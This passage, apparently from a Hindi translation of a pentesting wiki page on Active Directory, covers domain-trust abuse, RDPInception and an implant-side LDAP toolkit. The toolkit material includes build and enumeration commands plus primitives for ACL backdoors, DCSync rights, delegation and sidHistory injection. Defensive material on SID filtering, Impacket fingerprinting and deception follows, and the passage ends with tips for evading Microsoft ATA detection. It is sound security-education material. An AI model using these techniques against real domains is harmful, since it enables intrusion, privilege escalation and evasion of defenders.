WhenChanged     : 2/19/2021 10:15:24 PM
```

इस scenario में **आपका domain**, किसी **दूसरे domain** के principal को कुछ **privileges** दे रहा है।

हालाँकि, जब trusting domain द्वारा किसी domain पर **trust** किया जाता है, तो trusted domain एक **user बनाता है**, जिसका **नाम अनुमानित किया जा सकता है** और जिसका **password, trusted password** होता है। इसका मतलब है कि **trusting domain के किसी user तक पहुँचकर trusted domain में प्रवेश करना** संभव है, ताकि उसकी enumeration की जा सके और अधिक privileges तक पहुँचने की कोशिश की जा सके:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain को compromise करने का एक और तरीका है, domain trust की **विपरीत दिशा** में बनाया गया [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) ढूँढ़ना (यह बहुत आम नहीं है)।

trusted domain को compromise करने का एक और तरीका है, ऐसी machine पर इंतज़ार करना जहाँ **trusted domain का कोई user** **RDP** के ज़रिए login कर सके। फिर attacker, RDP session process में code inject करके वहाँ से **victim के origin domain तक पहुँच** सकता है।\
इसके अलावा, अगर **victim ने अपनी hard drive mount की हुई थी**, तो attacker **RDP session** process से **hard drive के startup folder** में **backdoors** रख सकता है। इस technique को **RDPInception** कहते हैं।


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust के दुरुपयोग को कम करना

### **SID Filtering:**

- Forest trusts के पार SID history attribute का फ़ायदा उठाने वाले attacks का जोखिम, SID Filtering से कम होता है। यह सभी inter-forest trusts पर default रूप से सक्रिय होता है। यह इस मान्यता पर आधारित है कि intra-forest trusts सुरक्षित हैं; Microsoft के अनुसार security boundary domain के बजाय forest है।
- हालाँकि, एक समस्या है: SID filtering applications और user access में बाधा डाल सकता है, इसलिए कभी-कभी इसे निष्क्रिय कर दिया जाता है।

### **Selective Authentication:**

- Inter-forest trusts के लिए, Selective Authentication का उपयोग यह सुनिश्चित करता है कि दोनों forests के users स्वतः authenticate न हों। इसके बजाय, trusting domain या forest के domains और servers तक पहुँचने के लिए users को स्पष्ट permissions की आवश्यकता होती है।
- ध्यान दें कि ये उपाय writable Configuration Naming Context (NC) के exploitation या trust account पर होने वाले attacks से सुरक्षा नहीं देते।

[**ired.team पर domain trusts के बारे में अधिक जानकारी।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## On-Host Implants से LDAP-आधारित AD का दुरुपयोग

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection), bloodyAD-शैली के LDAP primitives को x64 Beacon Object Files के रूप में फिर से implement करता है, जो पूरी तरह on-host implant (जैसे Adaptix C2) के अंदर चलते हैं। Operators `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` चलाकर pack compile करते हैं, `ldap.axs` load करते हैं और फिर beacon से `ldap <subcommand>` call करते हैं। सारा traffic LDAP (389) पर मौजूदा logon security context का उपयोग करके signing/sealing के साथ, या LDAPS (636) पर auto certificate trust के साथ चलता है; इसलिए socks proxies या disk artifacts की आवश्यकता नहीं होती।<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, और `get-groupmembers` short names/OU paths को full DNs में resolve करते हैं और संबंधित objects dump करते हैं।
- `get-object`, `get-attribute`, और `get-domaininfo`, arbitrary attributes (security descriptors सहित) और `rootDSE` से forest/domain metadata प्राप्त करते हैं।
- `get-uac`, `get-spn`, `get-delegation`, और `get-rbcd`, roasting candidates, delegation settings, और LDAP से सीधे मौजूदा [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors दिखाते हैं।
- `get-acl` और `get-writable --detailed`, trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), और inheritance की सूची बनाने के लिए DACL parse करते हैं, जिससे ACL privilege escalation के संभावित targets तुरंत मिल जाते हैं।

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### escalation और persistence के लिए LDAP write primitives

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ऑपरेटर को उन सभी जगहों पर नए principals या machine accounts तैयार करने देते हैं जहाँ OU rights मौजूद हों। Write-property rights मिलने पर `add-groupmember`, `set-password`, `add-attribute`, और `set-attribute` सीधे targets को hijack करते हैं।
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, और `add-dcsync जैसे ACL-केंद्रित commands किसी भी AD object पर WriteDACL/WriteOwner को password resets, group membership control, या DCSync replication privileges में बदल देते हैं—और PowerShell/ADSI artifacts छोड़े बिना। `remove-*` वाले counterparts जोड़े गए ACEs को साफ़ करते हैं।

### Delegation, roasting, और Kerberos का दुरुपयोग

- `add-spn`/`set-spn` तुरंत किसी compromised user को Kerberoastable बनाते हैं; `add-asreproastable` (UAC toggle) password को छुए बिना उसे AS-REP roasting के लिए चिह्नित करता है।
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) beacon से `msDS-AllowedToDelegateTo`, UAC flags, या `msDS-AllowedToActOnBehalfOfOtherIdentity` को फिर से लिखते हैं। इससे constrained/unconstrained/RBCD attack paths सक्षम होते हैं और remote PowerShell या RSAT की ज़रूरत नहीं रहती।

### sidHistory injection, OU relocation, और attack surface को आकार देना

- `add-sidhistory` किसी नियंत्रित principal के SID history में privileged SIDs inject करता है (देखें [SID-History Injection](sid-history-injection.md)), जिससे पूरी तरह LDAP/LDAPS के ज़रिए stealthy access inheritance मिलता है।
- `move-object` computers या users का DN/OU बदलता है, जिससे attacker assets को delegated rights के दायरे में ला सकता है और फिर `set-password`, `add-groupmember`, या `add-spn` का इस्तेमाल कर सकता है। move permissions और inheritance checks के लिए [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) देखें।
- सीमित दायरे वाले removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, आदि) operator को credentials या persistence हासिल करने के बाद तेज़ी से rollback करने देते हैं, जिससे telemetry कम से कम रहती है।

## AD -> Azure और Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## कुछ सामान्य बचाव

[**यहाँ credentials को सुरक्षित रखने के तरीके के बारे में और जानें।**](../stealing-credentials/credentials-protections.md)

### **Credential सुरक्षा के लिए रक्षात्मक उपाय**

- **Domain Admins पर पाबंदियाँ**: यह अनुशंसित है कि Domain Admins को केवल Domain Controllers में login करने की अनुमति हो और अन्य hosts पर उनका उपयोग न किया जाए।
- **Service Account के Privileges**: सुरक्षा बनाए रखने के लिए services को Domain Admin (DA) privileges के साथ नहीं चलाना चाहिए।
- **Privileges की समय-सीमा**: DA privileges की ज़रूरत वाले tasks के लिए, उनकी अवधि सीमित होनी चाहिए। ऐसा इस तरह किया जा सकता है: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event IDs 2889/3074/3075 का audit करें, फिर DCs/clients पर LDAP signing और LDAPS channel binding लागू करें, ताकि LDAP MITM/relay attempts रोके जा सकें।

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket गतिविधि की protocol-level fingerprinting

अगर आप आम AD tradecraft का पता लगाना चाहते हैं, तो **केवल operator के नियंत्रण वाले artifacts** जैसे renamed binaries, service names, temp batch files, या output paths पर निर्भर **न रहें**। देखें कि वैध Windows clients [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, और WMI traffic कैसे बनाते हैं, फिर ऐसे **implementation quirks** खोजें जो operator द्वारा `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, या `ntlmrelayx.py` संपादित करने के बाद भी बने रहते हैं।<sup>[[8]](#references)</sup>

- **उच्च-विश्वास वाले standalone candidates** (अपने baseline के विरुद्ध जाँच के बाद):
  - `auth_context_id = 79231 + ctx_id` का उपयोग करने वाला authenticated DCE/RPC
  - `0xff` से भरी DCE/RPC authentication padding
  - LDAP Kerberos binds, जिनमें raw Kerberos `AP-REQ` सीधे SPNEGO `mechToken` में रखा जाता है
  - ASCII जैसे दिखने वाले `ClientGuid` values वाले SMB2/3 negotiate requests
  - गैर-मानक namespace `//./root/cimv2` का उपयोग करने वाला WMI `IWbemLevel1Login::NTLMLogin`
  - Hardcoded Kerberos nonce values
- **Correlation/scoring features के रूप में ज़्यादा उपयोगी**:
  - Sparse या duplicated Kerberos etype lists, असामान्य/गायब `PA-DATA`, या TGS-REQ etype ordering जो native Windows से अलग हो
  - ऐसे NTLM Type 1 messages जिनमें version info गायब हो, या Type 3 messages जिनमें host names null हों
  - SPNEGO के बजाय DCE/RPC में भेजा गया raw NTLMSSP, DCE/RPC verification trailers का गायब होना, या SPNEGO/Kerberos OID mismatches
  - एक ही host/user/session/time window से मिले ऐसे कई traits, किसी एक कमज़ोर field से कहीं ज़्यादा मज़बूत संकेत होते हैं
- **इन्हें standalone alerts के बजाय enrichment के रूप में इस्तेमाल करें**:
  - Default filenames, output paths, random service names, temporary batch names, default computer account names, और tool-specific HTTP/WebDAV/RDP/MSSQL strings
  - Operators इन्हें आसानी से बदल सकते हैं; इनका सबसे अच्छा उपयोग यह समझाने में है कि cross-protocol cluster संदिग्ध क्यों है
- **Operational notes**:
  - इनमें से कुछ signals के लिए decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, या service-side visibility की ज़रूरत होती है
  - Alerts के रूप में लागू करने से पहले Samba/Linux clients, appliances, और legacy software के विरुद्ध जाँच करें
  - Baseline पर भरोसा बढ़ने के साथ detections को enrichment -> hunting -> alerting के चरणों में आगे बढ़ाएँ

### **Deception Techniques लागू करना**

- Deception लागू करने में decoy users या computers जैसे traps तैयार करना शामिल है, जिनमें passwords कभी expire न होने या Trusted for Delegation के रूप में चिह्नित होने जैसी विशेषताएँ होती हैं। विस्तृत तरीके में खास rights वाले users बनाना या उन्हें high privilege groups में जोड़ना शामिल है।<sup>[[2]](#references)</sup>
- इसका एक व्यावहारिक उदाहरण इन जैसे tools का उपयोग है: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniques लागू करने के बारे में और जानकारी [GitHub पर Deploy-Deception](https://github.com/samratashok/Deploy-Deception) पर मिल सकती है।

### **Deception की पहचान करना**

- **User Objects के लिए**: संदिग्ध संकेतों में असामान्य ObjectSID, कम logons, creation dates, और bad password counts शामिल हैं।
- **सामान्य संकेत**: संभावित decoy objects के attributes की तुलना वास्तविक objects से करने पर विसंगतियाँ सामने आ सकती हैं। [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) जैसे tools ऐसी deception की पहचान करने में मदद कर सकते हैं।

### **Detection Systems को bypass करना**

- **Microsoft ATA Detection Bypass**:
  - **User Enumeration**: ATA detection से बचने के लिए Domain Controllers पर session enumeration न करें।
  - **Ticket Impersonation**: Ticket बनाने के लिए **aes** keys का उपयोग detection से बचने में मदद करता है, क्योंकि इससे NTLM पर downgrade नहीं करना पड़ता।
  - **DCSync Attacks**: ATA detection से बचने के लिए किसी non-Domain Controller से execute करने की सलाह दी जाती है, क्योंकि Domain Controller से सीधे execute करने पर alerts trigger होंगे।

## References

- [1] [Domain Trusts पर हमला करने की मार्गदर्शिका](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory में Deception के लिए Trusts गढ़ना](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin से Enterprise Admin तक](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – Active Directory Exploitation के लिए In-Memory LDAP Toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM Hashes को Wordlist के रूप में हथियार बनाना](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket का विश्लेषण](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon के ज़रिए Active Directory Accounts पर कब्ज़ा करना](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 से संबंधित Netlogon secure channel connections में बदलावों को कैसे प्रबंधित करें](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [भूले हुए Null Session और MS-RPC interfaces की पड़ताल](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [क्या SID filter domains के बीच security boundary है? (भाग 4) - SID filtering bypass पर शोध](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [क्या SID filter domains के बीच security boundary है? (भाग 5) - Golden GMSA trust attack - child से parent तक](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [क्या SID filter domains के बीच security boundary है? (भाग 6) - Schema change trust attack - child से parent तक](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 के साथ DA से EA तक](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS का दुरुपयोग करके 5 मिनट में child domain के admins से enterprise admins तक पहुँचना: आगे की जानकारी](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [आस्तीन में एक ACE: Active Directory DACL Backdoors डिज़ाइन करना](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k module का source](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
